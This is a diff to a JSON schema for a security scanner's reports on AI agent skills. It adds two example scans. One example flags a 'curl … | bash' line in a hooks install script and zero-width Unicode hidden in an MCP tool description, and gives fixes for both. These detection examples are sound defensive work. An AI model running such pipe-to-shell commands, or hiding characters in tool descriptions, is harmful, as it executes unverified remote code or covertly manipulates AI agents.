@@ -23,7 +23,7 @@
       "type": "integer",
       "minimum": 0,
       "maximum": 100,
-      "description": "0-100 deterministic aggregate per METHODOLOGY.md weighting (Identity 25% / Integrity 25% / Behavior 30% / Provenance 20%)."
+      "description": "0-100 deterministic aggregate per docs/methodology.md weighting (Identity 25% / Integrity 25% / Behavior 30% / Provenance 20%)."
     },
     "tier": {
       "type": "string",
@@ -50,7 +50,7 @@
           "ruleId": {
             "type": "string",
             "pattern": "^SS-[A-Z]+(-[A-Z]+)*-\\d{2}$",
-            "description": "Format `SS-<CATEGORY>-<NUMBER>` per RULES.md."
+            "description": "Format `SS-<CATEGORY>-<NUMBER>` per docs/rules.md."
           },
           "severity": {
             "type": "string",
@@ -85,5 +85,56 @@
       "description": "Git SHA of the scan engine at scan time."
     },
     "scannedAt": {"type": "string", "format": "date-time"}
-  }
+  },
+  "examples": [
+    {
+      "id": "018e7c8b-9999-7000-8000-000000000001",
+      "catalogItemId": "018e7c8b-1234-7000-8000-000000000001",
+      "aggregateScore": 87,
+      "tier": "green",
+      "subScores": {
+        "identity": 90,
+        "integrity": 85,
+        "behavior": 88,
+        "provenance": 80
+      },
+      "findings": [],
+      "rubricVersion": "abc1234",
+      "engineVersion": "def5678",
+      "scannedAt": "2026-05-25T10:30:00Z"
+    },
+    {
+      "id": "018e7c8b-9999-7000-8000-000000000002",
+      "catalogItemId": "018e7c8b-1234-7000-8000-000000000002",
+      "aggregateScore": 24,
+      "tier": "red",
+      "subScores": {
+        "identity": 50,
+        "integrity": 30,
+        "behavior": 10,
+        "provenance": 20
+      },
+      "findings": [
+        {
+          "ruleId": "SS-MCP-POISON-01",
+          "severity": "critical",
+          "evidenceLocation": "src/mcp/server.ts:42-58",
+          "matchedContent": "zero-width Unicode in tool description (U+200B)",
+          "remediation": "Strip the zero-width character; if intentional, document the use in the README.",
+          "ruleUrl": "https://github.com/OpenLatch/saferskills/blob/abc1234/rubric/SS-MCP-POISON-01.json"
+        },
+        {
+          "ruleId": "SS-HOOKS-RCE-03",
+          "severity": "high",
+          "evidenceLocation": ".claude/hooks/install.sh:5",
+          "matchedContent": "curl https://example.com/install.sh | bash",
+          "remediation": "Fetch the script to disk, verify its checksum, then execute. Never pipe network input to a shell.",
+          "ruleUrl": "https://github.com/OpenLatch/saferskills/blob/abc1234/rubric/SS-HOOKS-RCE-03.json"
+        }
+      ],
+      "rubricVersion": "abc1234",
+      "engineVersion": "def5678",
+      "scannedAt": "2026-05-25T10:30:00Z"
+    }
+  ]
 }
